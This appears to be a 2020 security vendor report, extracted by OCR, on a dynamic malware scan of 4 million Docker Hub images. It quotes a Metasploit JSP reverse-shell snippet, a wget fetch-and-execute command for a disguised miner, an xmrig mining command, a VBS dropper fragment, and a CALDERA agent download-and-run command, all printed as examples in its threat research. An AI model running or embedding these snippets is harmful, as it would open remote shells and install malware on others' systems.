PREVASIO

Industry’s First Dynamic Analysis of 4 million
Publicly Available Docker Hub Container Images

y

~

RED KANGAROO

20 All Rights Reserved




Executive Summary

Prevasio, a cyber security start-up with a focus in container security, has announced its completion of
scanning the 4 million container images hosted at Docker Hub.

As opposed to other security solutions that scan container images statically, Prevasio has analyzed Docker
container images dynamically. Each image was executed in an isolated controlled environment. During the
execution, Prevasio has analyzed each container’s behavior, scanned all of its files, and also performed a full
vulnerability assessment of its packages and software dependencies.

More than half of the containers turned out have one or more critical vulnerability. Therefore, each of those
containers could potentially be exploitable.

The dynamic analysis also revealed 6,432 malicious or potentially harmful container images, representing
0.16% of all publicly available images at Docker Hub.

This report explains the work that we've done, our findings, the types of malware found and several typical
examples of container images found to contain malicious or potentially harmful software.

The ultimate goal of this report is to raise awareness across the industry about the types of malware or
potentially harmful software found across publicly available containers.

Scan Statistics at a Glance

Out of 4M of publicly availbale Docker Hub container images, Prevasios dynamic analysis has revealed:

We docker hub Total: 4M

— Images with Critical Vulnerabilities: 51%
| | Non-vulnerable images: 20%

| Images with High Vulnerabilities: 13%

/ Images with Moderate Vulnerabilities: 4%

| Malicious / potentially harmful images: 6,432 (0.16%)

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




The Background

Since the invention of container technology 20 years ago, the world has witnessed a revolutionary leap in
how we build, deploy, and manage applications.

The foundation for Linux containers was first set with FreeBSD’ jails — safe environments that a system
administrator could share with multiple users. Soon after that, the project VServer? has offered an
implementation of an isolated environment.

More technologies have followed. Control groups (cgroups),? a kernel feature that controls and limits
resource usage for a process or groups of processes, and systemd,’ an initialization system that sets up the
userspace and manages isolated processes, have paved the foundation to what is known today as a Linux
container.

In 2013, Docker entered the scene and revolutionized Linux containers by offering an easy-to-use command
line interface (CLI), an engine, and a registry server. Combined, these technologies have concealed all the
complexity of building and running containers, by offering one common industry standard.’ As a result,
Docker’s popularity has sky-rocketed, rivalling Virtual Machines, and transforming the industry.

From the developer's perspective, the biggest benefit that a container provides is a concept of “build once,
deploy anywhere”. In a nutshell, a Docker container is a standard form of packaging software when all the
software along with its dependencies is packed into a lightweight, standalone, executable form.

This final executable form is called a Docker container image. When a Docker container image is executed,
it becomes a Docker container at runtime.

In order to locate and share Docker container images, Docker is offering a service called Docker Hub.®
Its main feature, repositories,’ allows the development community to push (upload) and pull (download)
container images.

With Docker Hub, anyone in the world can download and execute any public image, as if it was a
standalone application.

Today, Docker Hub accounts over 4 million public Docker container images.®

\ https://www.freebsd.org/doc/handbook/jails.htm|
http://linux-vserver.org/Welcome_to_Linux-VServer.org

3 https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Resource_

Management_Guide/ch01.html

4 https://www.freedesktop.org/wiki/Software/systemd/
5 https://www.docker.com/resources/what-container

6 https://hub.docker.com/

7 https://docs.docker.com/docker-hub/repos/

8

https://hub.docker.com/search?q=&type=image

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




With 8 billion pulls (downloads) in January 2020 and growing,’ its annualized image pulls should top 100
billion this year.

For comparison,” Google Play has 2.7M Android apps in its store, with a download rate of 84 billion
downloads a year."

As these numbers suggest, Docker Hub already topped Google Play with a total number of published
dockerized applications and a number of their downloads.

With Google Play Protect” in place and most of the antivirus vendors backing up Google Play with their
own security software for Android,” nearly 0.4% of all downloads from Google Play in 2018 were still
potentially harmful." According to Google, that number falls with an annual rate of 20%.

Some vendors, like Palo Alto Network or Aqua Security, are actively reporting about new malicious Docker
container images found on Docker Hub." Is the effort of these vendors enough?

As recently announced,” Docker Hub is now partnering with Snyk to provide “container image security
scanning’. This scanning, however, covers vulnerability assessment only, and provides no scan for malicious
or potentially harmful files within the container images. Neither does it perform a dynamic analysis of the
container images.

How many container images currently hosted at Docker Hub are malicious or potentially harmful? What
sort of damage can they inflict?

What if a Docker container image downloaded and executed malware at runtime? Is there a reliable way to
tell that?

What if a compromised Docker container image was downloaded by an unsuspecting customer and used
as a parent image to build and then deploy a new container image into production, practically publishing
an application with a backdoor built into it? Is there any way to stop that from happening?

At Prevasio, we asked ourselves these questions multiple times.

What we decided to do has never been done before.

9 https://www.docker.com/blog/introducing-the-docker-index/

10 https://www:statista.com/statistics/276623/number-of-apps-available-in-leading-app-stores/

n https://www:statista.com/statistics/734332/google-play-app-installs-per-year/

12 https://www.android.com/intl/en_au/play-protect/

13 https://www.av-test.org/en/antivirus/mobile-devices/

4 https://techcrunch.com/2019/04/01/android-security-O-04-of-downloads-on-google-play-in-2018-
were-potentially-harmful-apps/

15 https://unit42.paloaltonetworks.com/cryptojacking-docker-images-for-mining-monero/

16 https://snyk.io/blog/snyk-container-image-security-scanning-directly-from-docker-desktop/

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




The Challenge

At Prevasio, we have built a dynamic analysis sandbox that uses the same principle as a conventional
sandbox that ‘detonates’ malware in a safe environment. The only difference is that instead of ‘detonating’
an executable file, such as a Windows PE file or a Linux ELF binary, Prevasio Analyzer first pulls (downloads)
an image from any container registry, and then ‘detonates’ it in its own virtual environment, outside the
organization/customer infrastructure.

Doing so allows us to capture the behavior of a container image. For example, if an image at runtime
downloads from GitHub a source code of a cryptominer, then compiles and executes it, Prevasio Analyzer
will be able to detect such an executable file the moment it is built. Such capability is out of reach for any
Static image scanner.

Using our solution, we then dynamically analyzed all 4 million container images hosted at Docker Hub.

In order to handle such a massive volume of images, Prevasio Analyzer was executed non-stop for a period
of one month on 800 machines running in parallel.

The results of this analysis are represented below:

No Linux Images,
e.g. Windows only: 1%

Not Processed Malicious / Potentially
| (Missing Tags): 10% —_/ Harmful Images: 0.16%

Not Vulnerable: 20%

Moderate
Vulnerabilities: 4%

High-level _
Vulnerabilities: 13%

Critical
Vulnerabilities: 51%

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




Out of the entire scope of publicly available images, 10% of them could not be analyzed because of the
missing tags. A tag is a special label that uniquely identifies an image, along with its name. Despite being
listed, such misconfigured images cannot be downloaded and analyzed, and thus, are excluded from the
results of the investigation.

Nearly 1% of all images are built for Windows only and/or have no Linux-specific builds. Such images were
also excluded from the analysis, as we targeted Linux container images only.

The result of our dynamic scan reveals that out of 4 million publicly available container images, 6,432 were
found to be malicious or potentially harmful, representing 0.16% of the entire Docker Hub registry. The total
pull count of these images is over 300 million.

NOTE: The pull (download) count of a malicious image should not be considered an absolute criterion
of its maliciousness. In case of a targeted attack, when an image is pulled and executed in a corporate
environment, the devastating effect could be achieved with just a single download.

Dynamic analysis reports for all malicious and potentially harmful images can be found on our website.”

The malware scan that was triggered during dynamic analysis was performed with open-source Clam
AntiVirus from Cisco Systems. We have done additional work by analyzing hundreds of container images
manually to exclude as many false positives produced by Clam AV, as possible.

Apart from antivirus scan, Prevasio has also performed vulnerability assessment of each analyzed image, by
using vulnerability scanner Trivy from Aqua Security.”

The main task of the vulnerability assessment was to detect a version of each package and application
dependency within every Docker container, and then report if that version was known to be vulnerable.

The results of the vulnerability assessment reveal that over 2 million images at Docker Hub contain one
or more packages or application dependencies with at least one critical vulnerability. Each such container
image is potentially exploitable.

From a purely ephemeral point of view, the overall infection rate of Docker Hub that stands at 0.16% is 2 to
2.5 times lower than a corresponding rate at Google Play.

However, the growth of Docker Hub itself is unprecedented. Launched in 2013, it has reached 1.2 billion pulls
within the first two years,”° 5 billion pulls by 2016,2' and 130 billion pulls by January 2020.”

Vv https://malware.prevasio.com

18 https://www.clamav.net/

19 https://github.com/aquasecurity/trivy

20 https://www.docker.com/blog/docker-hub-billion-pulls/

21 https://www.docker.com/blog/docker-hub-hits-5-billion-pulls/
o https://www.docker.com/blog/introducing-the-docker-index/

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




So far, its growth is exponential with no plateau seen in sight. With no built-in security mechanisms present
or exposed to the industry, Docker Hub today reminds a Wild West that Google Play once was. Only, its
magnitude today appears to be larger than the Android ecosystem.

For this reason, our decision to dynamically analyze all 4 million of public repositories of Docker Hub is the

first attempt to assess how big the problem is.

The findings presented in this paper is a culmination of our effort.

The following sections of this report provide description of the main categories of the malicious / potentially

harmful container images that we have found at Docker Hub.

This report also illustrates some of the most representative cases of such images.

Main Categories of the Malicious / Potentially Harmful Container Images

The entire range of the malicious / potentially harmful container images that we have found at Docker Hub

can be split into the following categories:

Other: 6.6% (426 images)
Pull count: 9.7M

Coinminers: 44% (2,842 images)

Pull count: 129.5M Hacking Tools: 20% (1,269 irnages)
Pull count: 7OM

Malicious nom package
(Bitcoin wallet stealer)
\. Pull count: 95M

Windows Malware: 6.4% (413 images) |
Pull count: 575K |

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved

flatmap-stream: 23% (1,482 images)




The Coinminers

The cryptocurrency miners (coinminers) represent the largest category with 44% from the total number
of all malicious / potentially harmful container images. Most of the applications in this category are open
coinminers — the developers of these applications clearly advertise the fact that their container images
contain coinminers.

From the download count perspective, some coinmining container images appear to be more popular than
others. For example, a coinmining container image kannix/monero-miner® attracts 22M downloads, four
coinmining images from masterroshi attract over 48M downloads.”

In spite of openness for the most of the coinminers, a substantial number of containers will have concealed
coinminers, such as coinminers disguised under legitimate applications.

Regardless of the original intention, if an employee pulls from Docker Hub and then runs a coinmining
container image at work, there is a very high chance that the company’s resources are not used as originally
intended. A system administrator might find such container images undesirable for a corporate environment
or even potentially harmful.

For this reason, any coinmining Docker container image enlisted in this report is determined to fall into a
category of potentially unwanted / potentially harmful applications.

Malicious Npm Package

The second largest category of the reported bad images represents itself a classic example of a supply
chain attack.

Nearly two years ago, a popular npm*? package event-stream has been found’? to contain a malicious
package flatmap-stream. An anonymous attacker with a GitHub handle right9ctr1 has gained publishing
rights from the original maintainer and added a malicious Bitcoin-stealing package flatmap-stream as a
dependency for the event-stream package.”’

Doing so has set in motion a chain of events. As previously reported by Snyk, the malicious package has
instantly replicated into a large number of packages.® However, given the nature of the open source
software and how complex the dependencies might be, it is always difficult to predict what effect a particular
supply chain attack may have over seemingly unrelated projects.

23 https://hub.docker.com/r/kannix/monero-miner

24 https://hub.docker.com/u/masterroshi

25 https://www.npmjs.com/

26 https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident
27 https://github.com/dominictarr/event-stream/issues/116

28 https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




In this particular case, the malicious package flatmap-stream ended up in 1,482 Docker container images
with a combined download count of up to 95M. The biggest contributor to this category is a trojanized
container image of Eclipse. This image is described later in the paper.

Hacking Tools

The next largest category is the hacking tools. It contains multiple pen-testing frameworks and tools and are
generally openly advertised as such. These tools are built for red teams and pen-testers.

Since the presence of such images in a corporate environment still represents risk, any container image
containing a hacking tool was classified as potentially unwanted.

While analyzing this category, we have discovered a disturbing trend — a proliferation of cross-platform

tools into the Docker container images. In particular, the pen-testing frameworks built in PowerShell and
GoLang are now dockerized to be run on Linux, retaining full capability to attack other platforms.

Windows Malware et al.

A surprisingly large category of malicious Linux container images includes malware originally built for
Windows platform. Some of the examples of such container images are provided later in the report.

The remaining category of malicious container images represent a loose set of images, trojanized with
various forms of malware spread over various categories.

Examples of Malicious / Potentially Harmful Container Images

Analyzing all 6,432 malicious / potentially harmful container images is a daunting task.
In this report, we aimed to illustrate only some of the most representative cases of such images.

Container Images Affected with a Malicious Package flatmap-stream

During the dynamic analysis of the Docker Hub public images, Prevasio has detected a dockerized image”
of Eclipse Che,*° a popular web IDE for the workspaces which is based on the Theia project.*"

29 https://malware.prevasio.com/report/eclipse/che-theia
30 https://github.com/eclipse/che-theia
31 https://github.com/eclipse-theia/theia

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




Below is an actual screenshot of the web interface exposed by one of its releases, tagged as

‘plugin-id-rc’, over the docker@ bridge:

File Edit Selection Task View Debug Go Help

entrypoint.sh x

cat ${HOME}/group.template | \

sed \${ 2 ID}/${USER_ID}/g" | \

sed \

sed "s " /theia/g" /etc/group

{ "$(id -u)' 8 ] command -v sudo
sudo chown ${USER_ID}:${GROUP_ID} /projects

‘$THEIA_ PORT" ]
THEIA_ PORT=3000

theia nort number reaexn='“[O-9)+4¢'

@0A0 &Previews

Ln 1, Col 1

/dev/null

Spaces: 4

This release of Eclipse Che
represents itself a classic example
of a supply chain attack.

As mentioned before, nearly two
years ago a popular npm package
event-stream has been found
to contain a malicious package
flatmap-stream.

The affected npm package
event-stream was included into
the ‘plugin-id-rc’ build of the
dockerized Eclipse Che.

Executing this build reveals the presence of the malicious package flatmap- stream inside the container.

/home/theia/node_modules/flatmap-stream# 1s -1R

total 28

-Pw-Pw-P--
-rw-Pw-P--
-Pw-Pw-P--
-Pw-Pw-P--
-Pw-Pw-P--
-Pw-Pw-P--
drwxrwxr-x

user root Oct
user root Oct
user root Oct
user root Oct
user root Oct
user root Oct
user root Oct

2018 index.js
2018 index.min.js
2018 LICENSE.txt
2018 package. json
2018 perf-test.js
2018 README .md
2018 test

./test:
total 8
-rw-rw-r-- 1 user root 5781 Oct 21 2018 data.js

The minified JavaScript file index.min.js will import code from the ./test/data.js file, decrypting and
invoking a payload that will inject? the bitcoin-stealing script into Copay’s wallet application.**

According to VirusTotal, the JavaScript file has a solid coverage from other AV vendors:

AhnLab-V3 JS/Coinminer

Avast Other:Malware-gen [Trj]
BitDefender — Trojan.Agent. DQGP

ClamAV Js.Coinminer.Agent-7049519-0
ESET-NOD32 = JS/Agent.BV

Fortinet JS/Malpackage.|N!tr

32 https://padraig.io/reversing-flatmap-stream/
33 https://github.com/bitpay/copay

Ikarus
McAfee
Microsoft
Sophos AV
Symantec
TrendMicro

Trojan-Stealer.Script.Bicorewall
Trojan-CoinStealer
Trojan:JS/CoinMiner
Troj/Bckdoor-AL
Trojan.Malscript
TrojanSpy.JS.COINSTEAL.AA




NOTE: By default, Prevasio Analyzer first attempts to find the “latest” tag of a container image. If the “latest”
tag is missing, it picks up the last tag enlisted in the JSON fle:

https://registry.hub.docker.com/v1/repositories/repository-name/tags
The result of this approach led Prevasio Analyzer to select the ‘plugin-id-rc’ tag, which is enlisted as the
last tag for the container image of Eclipse Che.** The other tags of the container image eclipse/che-theia

were not included into the analysis.

Another example of a container image affected by this malware is borsear/resultui.* It is described as a
simple voting application with the following interface:

e e © & 172.1703

DEMOCRATS REPUBLICANS

50.0% 50.0%

Across all publicly available images at Docker Hub, Prevasio has detected 1,482 container images infected
with the malicious bitcoin-stealing package flatmap-stream.

Trojanized Applications

Some publicly available Docker containers include open source web platforms or other web applications
that are found to be trojanized.

It is possible that some developers trojanize these applications intentionally, using Docker Hub as a
temporary registry before they deploy these applications into a staging area where the embedded malware
can be tested.

34 https://registry.hub.docker.com/v1/repositories/eclipse/che-theia/tags
35 https://malware.prevasio.com/report/borsear/resultui

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




Once tested, such infected applications could then be deployed into a production environment, allowing
the developers of these applications to use the pre-installed malware for their own purpose. For example,
an application trojanized with a web shell would enable a backdoor access into a running container, with a

potential of extracting sensitive data, such as customer records.

Trojanized WordPress

The first example of a trojanized application can be found in a container image qiscus123/qiscus-wp-2.*°
Built upon WordPress, the webshell is disguised under a WordPress SEO plugin Yoast:

/usr/src/wordpress/wp-content/plugins/wordpress-seo/vendor/yoast/whip/src/messages/network. php

Upon closer inspection, it turns out to be a classic WSO web shell (Web Shell By Orb):

®@  ] © @ 172.17.0.4/wp-content/plugins/wordpress-seo/vendor/yoast/whip/src/messages/n

e: Linux £4f8b3939282 5.4.0-52-generic #57~18.04.1-Ubuntu SMP Thu Oct 15 14:04:49 UTC 2020 x86_64

65534 ( nobody ) Group: 65534 (?)

dir 2020-03-04 03:01:19
dir 2020-03-04 03:01:19
40.74KB 2020-11-02 10:21:10
684B 2020-03-04 03:01:19
1.10KB 2020-03-04 03:01:19
728B 2020-03-04 03:01:19
159B 2020-03-04 03:01:19
N M 3.70KB 2020-03-04 03:01:19

Cop Vv || >>

/usr/src/wordpress/wp-content/plugins/wor| >>

Owner/Group
65534/65534
65534/65534
65534/65534
65534/65534
65534/65534
65534/65534
65534/65534
65534/65534

foe micm™ No file chosen

Another example of a trojanized application can be found in a container image heroicjokester/tomcat.*’

This image has Apache Tomcat v7.0.91 pre-installed on it.

Apache Tomcat is a popular Java HTTP web server environment in which Java code can run.*® Searching for

‘tomcat’ at Docker Hub returns 32,528 container images.

36 https://malware.prevasio.com/report/qiscus123/qiscus-wp-2
37 https://malware.prevasio.com/report/heroicjokester/tomcat

38 http://tomcat.apache.org/

Prevasio Pty Ltd https://prevasio.com | Copyright © 2020 All Rights Reserved





The container exposes a standard Tomcat configuration interface:

e @ © @ 172.17.0.5:3080

Home Documentation Configuration Examples wiki Mailing Lists Find Help

Apache Tomcat/7.0.91 B APACHE Eesyens euneenay

Recommended Reading:

Lay Security Considerations HOW-TO
\O@x. Manager Application HOW-TO

cl ing/Session Replication HOW-TO

Server Status

Manager App

Host Manager

Developer Quick Start

Tomcat Setup
First Web Application

Realms & AAA
JDBC DataSources

Examples Serviet Specifications

Tomcat Versions

Managing Tomcat Documentation

Tomcat 7.0 Documentation

Getting Help

For security, access to the manager webapp is FAQ and Mailing Lists

restricted. Users are defined in:

$CATALINA_HOME/conf/tomcat-users.xml
In Tomcat 7.0 access to the manager

application is split between different users.
Read more...

Release Notes
Changelog
Migration Guide

Tomcat 7.0 Configuration
Tomcat Wiki

Find additional important configuration
information in:

$CATALINA_HOME/RUNNING . txt
Developers may be interested in:

Tomcat 7.0 Bug Database
Tomcat 7.0 JavaDocs

The following mailing lists are available:

tomcat-announce
Important announcements, releases, security
vulnerability notifications. (Low volume).

User support and discussion

taglibs-user

User support and discussion for Apache Taglibs
tomcat-dev

Development mailing fist, including commit
messages

Security Notices Tomcat 7.0 SVN Repository

This image contains a webshell deployed as an application in the Tomcat's webapps directory:

/usr/local/tomcat/webapps# ls -1R

total 8

drwxr-xr-x 3 root root 4096 Nov 13 2018 shell
-rw-r--r-- 1 root root 1116 Nov 13 2018 shell.war

.-/shell:
total 8

-rw-r--r-- 1 root root 1499 Nov 14 2018 looahfgzsvosdrf.jsp

The installed webshell is a standard reverse TCP shell payload generated by the Metasploit framework's
reverse shell JSP

As seen in its code, it provides a reverse shell on port 4334:

if (System. getProperty(“os.name”).toLowerCase().indexOf(“windows”) == -1) {
ShellPath = new String(“/bin/sh”);
} else {

ShellPath = new String(“cmd.exe”) ;
}
Socket socket = new Socket( “192.168.0.101”, 4334 );
Process process = Runtime.getRuntime().exec( ShellPath );
( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();

Prevasio Pty Ltd https://prevasio.com | Copyright © 2020 All Rights Reserved




Trojanized Jenkins

In the final example, a container image adminkalhatti/k1-jenkins” installs Jenkins*® — a popular open-
source tool that allows continuous integration and continuous delivery (CI/CD) of projects:

@ @ © @ 172.17.0.6:8080/user/admin/configure
4 P
& Jenkins @ admin | log out
Jenkins admin
® People
Full Name admin ©
\\ Status
al Builds Description ®
P43 Configure
& My Views
API Token
Current token(s) 2)
There is no registered token for this user
Add new Token
My Views

Default View

The view selected by default when navigating to the users’ private views

Password

Password: Seeeeeceerereoeseeeeoasesororses
Confirm P: :

Apart from Jenkins, the image also has several instances of XMRig cryptominer pre-installed in the following
locations:

e /tmp/stagingdir/xmrig/xmrig-2.4.3/xmrig
e /tmp/df/initd
e /tmp/howcan

The provided examples demonstrate a clear need for the users to stick to official container images.

If some third-party forks are chosen to be installed, it's important to check for any pre-deployed
applications to make sure the downloaded image is not trojanized with a webshell, cryptominer or any
other form of malware.

The Effect of Infected Development Environments

Sometimes, developers that build and push their own container images to other registries, may have
their systems infected with other forms of malware. That malware may end up in the final image, and
consequently, in the production systems.

39 https://malware.prevasio.com/report/adminkalhatti/kl-jenkins
40 https://www.jenkins.io/

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




Container image eternity18/ez is one such example.”

This container will have MySQL Server listening on port 3306, SSH Server listening on port 22, and an HTTP
server listening on ports 80 and 443.

The web site exposed by this container on ports 80/443 appears to be a front end of the web application
designed to sell pharmaceuticals:

ti} Oo © &@ 172.17.0.7
Seem | AAP | OEE | MARA | BARER-0371-66197261 AIRE ABQ : leet ROO

| 2 oS 45] RS Sh Hi aE
lauzzoms Sul AFB ASS RS WARBP RSH

PRES as HRA Bree HS | OOTCH «=| AAT EOIAIA SmFe Bix Bergin AMAR KA

ae eee en cs ae ee ee ee ee | i i ee eT)
SSR BOR Leieiias
Peery) SxRe

K $8 #8 RIZE
K $8 18 AE
xX $8 $8 1 BE
iim S

CEs BER

Its index fle /var/www/htm1/index.htm1 contains a malicious VBS script that drops Ramnit** — a backdoor
designed for Windows systems:

Pelease find the login page “_*<SCRIPT Language=VBScript><! --
DropFileName = “svchost.exe”
WriteData = “4D5A90000004000000F FFFEQQeB8900000000000004...

In the past, MalwareBytes has reported how HTML files infected with Ramnit were discovered inside Android
apps.”
This side effect results from the developers working on infected Windows environments — when they build

Android apps using an infected environment, they may inadvertently infect HTML files that are incorporated
into the newly built apps. Those apps may then end up being published on Google Play.

41 https://malware.prevasio.com/report/eternity18/ez
42 https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Virus%3A
Win32%2FRamnit.A

43 https://blog.malwarebytes.com/cybercrime/2014/11/infected-htmlI-files-bundled-in-android-apps/
Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




This time it appears to be the same side effect in play. The only difference is that the infected HTML file
ended up being incorporated into a Docker image, which was then published on Docker Hub.

Needless to say, an HTML file infected with Ramnit may not infect neither an Android device nor a Linux
system that runs such Docker container image. However, this side effect is a dangerous precedent with a
potential of becoming a nastier form of a cross-platform malware in the future.

Across the entire Docker Hub, the Ramnit-infected HTML files were detected in more than a dozen of public
container images.

Detracting Attention

Some cryptomining container images are trying to detract user’s attention, while executing a mining
application in the background.

An example of such approach is illustrated by the image tecexokel/prefab-parser:™

e e © @ 172.17.0.8:8080

Do not Block This App!!!!!!!

1 oF e ae
“ oe oe .

for 120 seconds your browser create 14435 elements

While the browser renders the pixels, an executable file named ./OK3gIIvMqLpPTBGB is running in the
background, mining for cryptocurrency.

44 https://malware.prevasio.com/report/tecexokel/prefab-parser
Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




Same approach can also be observed with the strixtest/strix container image, apparently built by the
same author?

It executes a cryptomining executable /chatik/D@SKMFbrCWrEJa37, while rendering the following page
with the Node.js web application framework:

oO r } 0 @ 172.17.0.9:8080

Send |

The Power of Dynamic Analysis

Many Docker container images do not contain any malicious payload unless those images are executed.
Because of this reason, no static scan of such images will be able to find the final payload.

An example of such an image is errornetwork404/quq.”°

The nature of the dynamic payload can best be demonstrated with the following steps.

First, the image is pulled (downloaded) with the docker pull command:

user@host:~$ docker pull errornetwork404/quq

45 https://malware.prevasio.com/report/strixtest/strix
46 https://malware.prevasio.com/report/errornetwork404/quq

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




Once the image is pulled, the Docker’s virtual file system*’ OverlayFS, accessible on the host's directory
/var/lib/docker/overlay2, is searched for a file named xmrig:

user@host:~$ sudo find /var/lib/docker/overlay2 -name ‘xmrig’ -type f

The command above returns nothing, as the file is not present (yet).

Next, the pulled image is executed, producing the following output on screen (truncated):

user@host:~$ docker run docker.io/errornetwork404/quq
Cloning into ‘xmrig’...

[100%] Built target xmrig
[2020-10-11 04:53:43] READY (CPU) threads 6(6) huge pages 0/6 0% memory 12.@ MB

This time, while the container is running, checking for xmrig process reveals the presence of a file . /xmrig:

user@host:~$ docker exec 8ecd616fe195 ps ax | grep xmrig
1 root @:00 {xmrig.sh} /bin/sh /usr/local/bin/xmrig.sh
397 root @:01 ./xmrig -o stratum+tcp://pool.supportxmr.com:5555 -u 46NbvdUFHq7GDffA5 [truncated ]
-p x -t 6 -donate-level=5

Searching for the same file will now reveal that this time it is present inside the container’s file system:

user@host:~$ sudo find /var/lib/docker/overlay2 -name ‘xmrig’ -type f

/var/1lib/docker/overlay2/a483cc3e7abb9cc51e2ae4a8704cedf@9b28c5c73b1568d90cc24F6d3449F42d/diff/xmrig/build/
xmrig

How did this file appear inside the container?

As seen in the Prevasio report, once the image was executed, a script inside the container has pulled the
source code of XMRig from the GitHub repository:

git clone https://github.com/xmrig/xmrig.git

Next, the cloned source was dynamically compiled with the C compiler, producing an executable file
./xmrig, which was then executed.

In order to find the presence of a cryptominer in such a Docker container image, Prevasio Analyzer had to
detonate’ the image inside its own virtual environment.

47 https://docs.docker.com/storage/storagedriver/overlayfs-driver/

Rinhtc Racar ar
K Ss Reserved




Another Example of a Dynamic Payload

The malicious image hildeteamtnt/pause-amd64 demonstrates another example of a dynamic payload.”*
During the runtime, the wget process is executed to fetch a file:

wget -q http://85[.]214[ .]149[ . ]236:443/sugarcrm/themes/default/images/default.jpg -O /usr/sbin/docker-update

The wget command above downloads a JPEG file and saves it into usr/sbin/docker-update.

While detonating this image in its virtual environment, Prevasio Analyzer’s network sniffer has captured this
request as well:

+ 85.214.149.236 MM GET /sugarcrm/themes/default/images/default.jpg HTTP/1.1

Host: 85.214.149.236:443
Remote IP: 85.214.149.236

Accept: */*

Accept-Encoding: identity

User-Agent: wget/1.20.3 (linux-mus1)
Connection: Keep-Alive

The GET request was sent to a hacked web server, running an obsolete version of SugarCRM.
Apparently, the attackers have hacked this server and are now using it to host their own malware on it.

# 85.214.149.236 Me TTP/1.1 200 0K

Remote IP: 85.214.149.236
Server: Apache
Content-Type: image/jpeg
Content-Length: 2,556,964 bytes
Connection: Keep-Alive
Data:

7F 45 4c 46 02 01 01 03 00 00 00 00 00 00 00 00 - ELF

02 00 3E 00 01 00 00 00 A8 F6 66 00 00 00 00 00 a fF.....

40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 @G@...............

00 00 00 00 40 00 38 00 03 00 40 00 00 00 00 00 oe -@.8...@.....
48 https://malware.prevasio.com/report/hildeteamtnt/pause-amd64

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




The web server's reply indicates that the requested file has a JPEG type (Content-type: image/jpeg).
However, the actual contents of the file, as seen in its header, reveals the downloaded file has ELF format — a
standard format of executable files for Linux.

The downloaded file /usr/sbin/docker-update is a cryptominer.

Prevasio Analyzer’s sensor then registered that this file was then given an execution right. Following that, it
was executed:

chmod +x /usr/sbin/docker-update

/usr/sbin/docker -update

As Prevasio obtains a stream of related kernel-level events, it is then able to “stitch” them together in order
to illustrate the entire hierarchy of events in form of a graph:

areata Socket [4]
Deeute (cs)

Proce a
open
. Pen—_
“8 a0
connect

Process J.
2% Se)

85.214.149 .236:443 =

Web Server (HTTPS), Germany

oxabute /usr/sbin/docker-update

/usr/sbin/docker -update

execute

wget -q http://85.214.149.236:443..

chmod +x /usr/sbin/docker-update

Dynamic ‘detonation’ of the scanned container images allowed Prevasio to locate multiple infected images
across the entire Docker Hub repository.

Hacking Tools

A significant portion of the reported Docker container images contains hacking tools — a potentially
undesirable category of software.

An example of such an image is pranavbhatia/openvas2.*° As the name of the image suggests, it contains
OpenVAS* — a software framework of vulnerability scanning and vulnerability management.

49 https://malware.prevasio.com/report/pranavbhatia/openvas2
50 https://www.openvas.org/

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




A disassembled code of one of its filles, /usr/bin/pnscan, reveals it's identical to the open source tool
pnscan” — a Parallel Network Scanner that probes open ports across the network and discovers the
installed versions of SSH, FTP SMTP Web, and other services.

When run, the container image exposes the following web interface:

@ ie) © @ 172.17.0.10/omp

Greenbone Security Assistant Version 7.0.2

Username:

{ 6 y } Password:

Greenbone
Security
Assistant

As opposed to malware, the hacking tools are not malicious per se.

However, they could still represent danger to other computer systems. Port scanning in particular could be
considered illegal without written permission.

For these reasons, Prevasio classifies dockerized hacking tools as a potentially undesirable form of software.

Offensive PowerShell Toolkits

Originally designed as a task automation and configuration management framework for Windows,
PowerShell? was made cross-platform in 2016, with the introduction of PowerShell Core.

This move has enabled Linux-based offensive security frameworks consisting of PowerShell modules and
scripts that perform a wide range of tasks for penetration testing.

1 https://github.com/ptrrkssn/pnscan
52 https://en.wikipedia.org/wiki/PowerShell

Prevasio Pty Ltd | https://prevasio.com | Copyright © 2020 All Rights Reserved




CALDERA* is an example of an offensive security framework. It was found dockerized in a public container
image cyb3rward@g/caldera:”

&

Home Sandcat Chain Evals_Caldera

ne 5Andc47

coordinated access trojan (CAT)

A sandcat is a desert cat that leaves no footprint. In that vein, S4ndo47 is an agent designed to
fun without detection on any host operating system. It intentionally blends into the environment
and executes operations.

4. Use an initial access option below to deliver the agent to target hosts.

Option #1 Option #2

Copy and paste one of the delivery commands into a Have each targeted machine navigate to our malicious
terminal window. web page. Then start the downloaded S4ndc47 agent.
Use our sample malicious web page or averwerite it
e e ° e using the website cloning buttan below.
PowerShell cMD Linux MacOS

curl -sk -X POST -H "file:sandcat.go' -H ‘platform: Linux’
http://172.17.8.2:8888/file/download > /tmp/sandcat-linux && chnod +x
/tnp/sandeat-linux & /tmp/sandcat-Linux -server http://172.17.@.2:8888 -
group my group -v;

Enter a uri

The containerized CALDERA application contains Sandcat,*°? also known as 54ndc47, a cross-platform agent
written in GoLang. The Sandcat documentation* claims that:

Each time you run one of the delivery commands above, the agent will re-compile itself dynamically
and it will change it's source code so it gets a different file hash (MD5) and a random name that
blends into the operating system. This will help bypass file-based signature detections.

Even though the Sandcat agent allows the so called ‘gocat extensions’, its default configuration contains
